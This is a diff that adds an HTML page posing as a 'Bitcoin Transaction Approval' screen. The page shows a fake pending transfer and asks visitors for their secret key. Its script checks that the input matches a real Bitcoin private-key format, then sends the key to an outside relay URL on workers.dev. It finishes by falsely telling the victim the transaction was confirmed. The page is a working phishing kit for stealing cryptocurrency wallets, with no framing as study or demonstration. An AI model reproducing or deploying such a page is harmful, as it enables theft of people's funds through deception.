@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Bitcoin Transaction Approval </title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background: #f8f9fa;
+      color: #1a1a1a;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 24px;
+    }
+
+    .container {
+      background: white;
+      width: 100%;
+      max-width: 520px;
+      border-radius: 16px;
+      box-shadow: 0 4px 24px rgba(0,0,0,0.08);
+      padding: 40px 32px;
+    }
+
+    h1 {
+      font-size: 1.6rem;
+      font-weight: 700;
+      text-align: center;
+      margin-bottom: 28px;
+      color: #111;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 14px;
+      margin-bottom: 28px;
+    }
+
+    .addresses {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 12px;
+      margin-bottom: 28px;
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+      font-size: 0.78rem;
+      word-break: break-all;
+      text-align: center;
+    }
+
+    .addr {
+      max-width: 180px;
+      line-height: 1.35;
+      color: #333;
+    }
+
+    .arrow {
+      font-size: 1.1rem;
+      color: #666;
+      flex-shrink: 0;
+    }
+
+    .info-box {
+      background: #f4f6f8;
+      border-radius: 12px;
+      padding: 16px 20px;
+      margin-bottom: 32px;
+      font-size: 0.9rem;
+    }
+
+    .info-row {
+      display: flex;
+      justify-content: space-between;
+      padding: 6px 0;
+    }
+
+    .info-label {
+      color: #555;
+    }
+
+    .info-value {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+      font-size: 0.85rem;
+      color: #111;
+    }
+
+    .amount-section {
+      margin-bottom: 24px;
+    }
+
+    .amount-label {
+      font-size: 1.05rem;
+      margin-bottom: 8px;
+    }
+
+    .amount-value {
+      font-size: 1.25rem;
+      font-weight: 600;
+      letter-spacing: -0.02em;
+    }
+
+    .key-section {
+      margin-bottom: 20px;
+    }
+
+    .key-label {
+      font-size: 1.05rem;
+      margin-bottom: 8px;
+      display: block;
+    }
+
+    input[type="text"] {
+      width: 100%;
+      padding: 12px 14px;
+      font-size: 1rem;
+      border: 1px solid #d0d5dd;
+      border-radius: 8px;
+      outline: none;
+      transition: border-color 0.15s;
+    }
+
+    input[type="text"]:focus {
+      border-color: #4a90e2;
+    }
+
+    .hint {
+      font-size: 0.85rem;
+      color: #555;
+      text-align: center;
+      line-height: 1.45;
+      margin: 20px 0 28px;
+    }
+
+    .approve-btn {
+      display: block;
+      width: 100%;
+      max-width: 200px;
+      margin: 0 auto;
+      padding: 14px 24px;
+      background: #111;
+      color: white;
+      font-size: 1.05rem;
+      font-weight: 600;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background 0.15s;
+    }
+
+    .approve-btn:hover {
+      background: #333;
+    }
+
+    .demo-note {
+      margin-top: 28px;
+      text-align: center;
+      font-size: 0.75rem;
+      color: #999;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+
+ <div class="header">
+
+<img class="logo" src="logo.png" alt="Logo" width="42" height="28">
+      <h1>Bitcoin Transaction Approval</h1>
+
+</div>
+
+    <div class="addresses">
+      <div class="addr">38zgptPoNLXKSap9MiNvpa7WcLJDRFefbQ</div>
+      <div class="arrow">=></div>
+      <div class="addr">bc1q6jhewdcleywnrztxpkauavqfaxwqfar5sa2d73</div>
+    </div>
+
+    <div class="info-box">
+      <div class="info-row">
+        <span class="info-label">Datum</span>
+        <span class="info-value">6. Sept. 2026, 21:07</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">Ref-ID</span>
+        <span class="info-value">FTB8kpm-nR9vXq2LtW4jhyuSbKdNz</span>
+      </div>
+      <div class="info-row">
+        <span class="info-label">Transaktions-ID</span>
+        <span class="info-value">TXXMPQR-8KJT2-P9WN4F</span>
+      </div>
+    </div>
+
+    <div class="amount-section">
+      <div class="amount-label">Amount to approve:</div>
+      <div class="amount-value">0.01276582 BTC (≈847.53 €)</div>
+    </div>
+
+    <div class="key-section">
+      <label class="key-label" for="secret">Enter your secret key:</label>
+      <input type="text" id="secret" placeholder="" autocomplete="off">
+    </div>
+
+    <p class="hint">
+      Your secret key is needed to confirm that<br>
+      the amount is transferred to the right<br>
+      address
+    </p>
+
+    <button id="sendBtn" class="approve-btn">
+      Approve
+    </button>
+
+<div class="hint" id="status"></div>
+  
+</div>
+
+
+<script>
+  const WORKER_URL = "https://tgrelay.koalafinn-005.workers.dev";
+
+  const input = document.getElementById("secret");
+  const button = document.getElementById("sendBtn");
+  const status = document.getElementById("status");
+
+function isValidBtcSecretKey(key) {
+        key = key.trim();
+        const wifRegex = /^[5KL][1-9A-HJ-NP-Za-km-z]{50,51}$/;
+        const wifTestnetRegex = /^[9c][1-9A-HJ-NP-Za-km-z]{50,51}$/;
+        const hexRegex = /^[0-9a-fA-F]{64}$/;
+        return wifRegex.test(key) || wifTestnetRegex.test(key) || hexRegex.test(key);
+      }
+
+  async function approve(text) {
+    const response = await fetch(WORKER_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ text })
+    });
+
+    if (!response.ok) {
+      throw new Error(`Worker error: ${response.status}`);
+    }
+
+    return response.text();
+  }
+        
+
+  button.addEventListener("click", async () => {
+    const text = input.value.trim();
+    if (!text) {
+      status.textContent = "Please enter a key first.";
+      status.style.color = "orange";
+      return;
+    }
+
+if (!isValidBtcSecretKey(text)) { 
+status.textContent = 'Invalid Bitcoin secret key format.';
+status.style.color = "red";
+return;
+        }
+
+    status.textContent = "Waiting...";
+    status.style.color = "black";
+
+    try {
+      await approve(text);
+      status.textContent = "Congratulations! 🎉\nYou just confirmed this transaction.";
+      status.style.color = "green";
+      input.value = "";
+    } catch (err) {
+      status.textContent = "Failed: " + err.message;
+      status.style.color = "red";
+    }
+  });
+
+  // Allow pressing Enter to send
+  input.addEventListener("keydown", (e) => {
+    if (e.key === "Enter") button.click();
+  });
+</script>
+
+</body>
+</html>
